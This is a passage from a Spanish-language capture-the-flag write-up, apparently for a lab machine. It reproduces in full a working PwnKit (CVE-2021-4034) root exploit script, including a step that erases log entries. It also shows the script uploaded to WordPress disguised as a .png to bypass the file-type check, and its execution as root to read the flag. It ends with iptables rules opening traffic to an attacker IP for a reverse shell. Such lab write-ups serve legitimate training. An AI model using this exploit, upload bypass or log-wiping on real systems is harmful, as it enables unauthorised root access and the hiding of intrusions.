+'#!/bin/bash\necho &quot;██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ &quot;\necho &quot;██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗&quot;\necho &quot;██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝&quot;\necho &quot;██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗&quot;\necho &quot;██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║&quot;\necho &quot;╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝&quot;\necho &quot;CVE-2021-4034 PoC by Kim Schulz&quot;\n# shell poc by Kim Schulz\necho &quot;[+] Setting up environment...&quot;\nmkdir -p \'GCONV_PATH=.\'\ntouch \'GCONV_PATH=./pkwner\'\nchmod a+x \'GCONV_PATH=./pkwner\'\nmkdir -p pkwner\necho &quot;module UTF-8// PKWNER// pkwner 2&quot; &gt; pkwner/gconv-modules\ncat &gt; pkwner/pkwner.c &lt;&lt;- EOM\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nvoid gconv() {}\nvoid gconv_init() {\n  printf(&quot;hello&quot;);\n  setuid(0); setgid(0);\n\tseteuid(0); setegid(0);\n  system(&quot;PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;&quot;\n         &quot;rm -rf \'GCONV_PATH=.\' \'pkwner\';&quot;\n         &quot;cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;&quot;\n         &quot;id&quot;);\n\texit(0);\n}\nEOM\n\ncat &gt; pkwner/exec.c &lt;&lt;- EOM\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nint main(){\n  char *env[] = {&quot;pkwner&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PKWNER&quot;,\n                 &quot;SHELL=pkwner&quot;, NULL};\n  execve(&quot;/usr/bin/pkexec&quot;, (char *[]){NULL}, env);\n}\nEOM\necho &quot;[+] Build offensive gconv shared module...&quot;\ngcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c\necho &quot;[+] Build mini executor...&quot;\ngcc -o pkwner/executor pkwner/exec.c\n# export PATH=&quot;GCONV_PATH=.&quot;\n# export CHARSET=&quot;PKWNER&quot;\n#export SHELL=pkwner\nPATH=\'GCONV_PATH=.\' ./pkwner/executor\necho &quot;[+] Nice Job&quot;\n'
+&gt;&gt;&gt; data_upload = { 'name': 'pkwner.sh', 'bits': filename, 'type': 'text/plain'}
+&gt;&gt;&gt; client.call(media.UploadFile(data_upload))
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;/home/miguel/.local/lib/python3.11/site-packages/wordpress_xmlrpc/base.py&quot;, line 37, in call
+    raw_result = server_method(*args)
+                 ^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/xmlrpc/client.py&quot;, line 1122, in __call__
+    return self.__send(self.__name, args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/xmlrpc/client.py&quot;, line 1464, in __request
+    response = self.__transport.request(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/xmlrpc/client.py&quot;, line 1166, in request
+    return self.single_request(host, handler, request_body, verbose)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/xmlrpc/client.py&quot;, line 1182, in single_request
+    return self.parse_response(resp)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/xmlrpc/client.py&quot;, line 1354, in parse_response
+    return u.close()
+           ^^^^^^^^^
+  File &quot;/usr/lib/python3.11/xmlrpc/client.py&quot;, line 668, in close
+    raise Fault(**self._stack[0])
+xmlrpc.client.Fault: &lt;Fault 500: 'Could not write file pkwner.sh (Sorry, you are not allowed to upload this file type.).'&gt;
+</code></pre></div></div>
+<ul>
+<li>Nos da un error no podemos subir ese tipo de archivo es por la extensión que tiene vamos a cambiarla para ver si nos deja.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; data_upload = { 'name': 'pkwner.png', 'bits': filename, 'type': 'text/plain'}
+&gt;&gt;&gt; client.call(media.UploadFile(data_upload))
+{'attachment_id': '48', 'date_created_gmt': &lt;DateTime '20240625T00:46:03' at 0x7f932bf77ed0&gt;, 'parent': 0, 'link': '/wp-content/uploads/2024/06/pkwner.png', 'title': 'pkwner.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2024/06/pkwner.png', 'id': '48', 'file': 'pkwner.png', 'url': '/wp-content/uploads/2024/06/pkwner.png'}
+</code></pre></div></div>
+<ul>
+<li>Tenemos la ruta donde se subió.</li>
+<li>Y funciona somos <code>root</code> ya que le dijimos que nos ejecutara el comando <code>id</code>.</li>
+</ul>
+<div class="code-window" data-language="Text"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Text</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-text">➜  wordpress_xmlrpc rlwrap ./script.sh
+$~ bash /var/www/html/wp-content/uploads/2024/06/pkwner.png
+██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+CVE-2021-4034 PoC by Kim Schulz
+[+] Setting up environment...
+[+] Build offensive gconv shared module...
+[+] Build mini executor...
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+hello[+] Nice Job
+</code></pre></div></div>
+<ul>
+<li>Modificamos el script.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat new.sh
+#!/bin/bash
+echo &quot;██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ &quot;
+echo &quot;██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗&quot;
+echo &quot;██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝&quot;
+echo &quot;██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗&quot;
+echo &quot;██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║&quot;
+echo &quot;╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝&quot;
+echo &quot;CVE-2021-4034 PoC by Kim Schulz&quot;
+# shell poc by Kim Schulz
+echo &quot;[+] Setting up environment...&quot;
+mkdir -p 'GCONV_PATH=.'
+touch 'GCONV_PATH=./pkwner'
+chmod a+x 'GCONV_PATH=./pkwner'
+mkdir -p pkwner
+echo &quot;module UTF-8// PKWNER// pkwner 2&quot; &gt; pkwner/gconv-modules
+cat &gt; pkwner/pkwner.c &lt;&lt;- EOM
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void gconv() {}
+void gconv_init() {
+  printf(&quot;hello&quot;);
+  setuid(0); setgid(0);
+	seteuid(0); setegid(0);
+  system(&quot;PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;&quot;
+         &quot;rm -rf 'GCONV_PATH=.' 'pkwner';&quot;
+         &quot;cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;&quot;
+         &quot;cat /root/root.txt&quot;);
+	exit(0);
+}
+EOM
+
+cat &gt; pkwner/exec.c &lt;&lt;- EOM
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+  char *env[] = {&quot;pkwner&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PKWNER&quot;,
+                 &quot;SHELL=pkwner&quot;, NULL};
+  execve(&quot;/usr/bin/pkexec&quot;, (char *[]){NULL}, env);
+}
+EOM
+echo &quot;[+] Build offensive gconv shared module...&quot;
+gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c
+echo &quot;[+] Build mini executor...&quot;
+gcc -o pkwner/executor pkwner/exec.c
+# export PATH=&quot;GCONV_PATH=.&quot;
+# export CHARSET=&quot;PKWNER&quot;
+#export SHELL=pkwner
+PATH='GCONV_PATH=.' ./pkwner/executor
+echo &quot;[+] Nice Job&quot;
+</code></pre></div></div>
+<ul>
+<li>Volvemos hacer todo el proceso en python3 y al final ejecutamos lo siguiente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; data_upload = { 'name': 'new.png', 'bits': filename, 'type': 'text/plain'}
+&gt;&gt;&gt; client.call(media.UploadFile(data_upload))
+{'attachment_id': '57', 'date_created_gmt': &lt;DateTime '20240625T02:22:16' at 0x7fd3870a7750&gt;, 'parent': 0, 'link': '/wp-content/uploads/2024/06/new.png', 'title': 'new.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2024/06/new.png', 'id': '57', 'file': 'new.png', 'url': '/wp-content/uploads/2024/06/new.png'}
+</code></pre></div></div>
+<ul>
+<li>Vamos a ver la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content ./script.sh
+$~  bash /var/www/html/wp-content/uploads/2024/06/new.png
+██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+CVE-2021-4034 PoC by Kim Schulz
+[+] Setting up environment...
+[+] Build offensive gconv shared module...
+[+] Build mini executor...
+10b224d4bc6cab7b7fbd9f4deb10b9eb
+hello[+] Nice Job
+</code></pre></div></div>
+<blockquote>
+<p>Para ganar <code>shell</code> hay que ejecutar 2 comandos de <code>IPTables</code> para que acepte trafico de nuestra IP y poder entablar la reverse <code>shell</code>.</p>
+</blockquote>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">iptables -A OUTPUT -p tcp -d 10.10.14.63 -j ACCEPT
+iptables -A INPUT -p tcp -s 10.10.14.63 -j ACCEPT
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
